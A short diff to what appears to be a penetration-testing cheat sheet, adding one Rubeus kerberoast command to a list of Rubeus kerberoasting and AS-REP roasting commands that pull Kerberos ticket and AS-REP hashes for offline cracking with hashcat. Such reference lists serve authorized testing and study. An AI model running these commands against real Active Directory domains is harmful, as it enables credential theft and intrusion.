@@ -2237,6 +2237,7 @@ C:\> .\Rubeus.exe kerberoast /stats
 C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 C:\> .\Rubeus.exe kerberoast /user:<username> /nowrap
 C:\> .\Rubeus.exe kerberoast /domain:<domain> /user:<username> /nowrap
+C:\> .\Rubeus.exe kerberoast /tgtdelag /user:<username> /nowrap
 C:\> .\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
 ```
 
